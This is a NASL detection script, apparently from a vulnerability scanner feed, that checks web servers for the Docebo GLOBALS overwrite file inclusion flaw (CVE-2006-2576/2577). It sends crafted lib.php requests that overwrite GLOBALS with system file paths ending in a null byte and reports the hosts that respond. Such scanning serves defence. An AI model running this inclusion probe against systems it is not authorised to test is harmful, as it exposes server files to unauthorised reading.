if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.200011" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)" );
	script_tag( name: "cvss_base", value: "5.1" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2006-2576", "CVE-2006-2577" );
	script_bugtraq_id( 18109 );
	script_xref( name: "OSVDB", value: "25757" );
	script_name( "Docebo GLOBALS Variable Overwrite Vulnerability" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2008 Ferdy Riphagen" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "solution", value: "Disable PHP's register_globals and/or upgrade to a newer PHP release." );
	script_tag( name: "summary", value: "The remote host contains a PHP application that is vulnerable
to remote and local file inclusions.

Description :

At least one Docebo application is installed on the system.

Docebo has multiple PHP based applications, including a content
management system (DoceboCMS), an e-learning platform
(DoceboLMS) and a knowledge maintenance system (DoceboKMS)

By using a flaw in some PHP versions (PHP4 <= 4.4.0 and PHP5 <= 5.0.5)
it is possible to include files by overwriting the $GLOBALS variable.

This flaw exists if PHP's register_globals is enabled." );
	script_xref( name: "URL", value: "http://secunia.com/advisories/20260/" );
	script_xref( name: "URL", value: "http://www.hardened-php.net/advisory_202005.79.html" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
success = FALSE;
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/doceboLms", "/doceboKms", "/doceboCms", "/doceboCore", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: NASLString( dir, "/index.php" ), port: port );
	if(egrep( pattern: "^Set-Cookie:.+docebo_session=", string: res ) || egrep( pattern: "title=\"Powered by Docebo(KMS|LMS|CMS)\"", string: res ) || egrep( pattern: "powered_by.+<a href[^/]+\\/\\/www\\.docebo\\.org", string: res )){
		for pattern in keys( files ) {
			uri = "/lib/lib.php";
			globals[0] = "GLOBALS[where_framework]=";
			globals[1] = "GLOBALS[where_lms]=";
			lfile = "/" + files[pattern];
			for(n = 0;globals[n];n++){
				req = http_get( item: NASLString( dir, uri, "?", globals[n], lfile, "%00" ), port: port );
				recv = http_keepalive_send_recv( data: req, port: port, bodyonly: 1 );
				if(egrep( pattern: pattern, string: recv )){
					n++;
					success = TRUE;
					path += NASLString( "http://", get_host_name(), dir, "\\n" );
				}
			}
		}
	}
}
if(success){
	report = NASLString( "Below the full path to the vulnerable Docebo application(s):\\n\\n", path );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

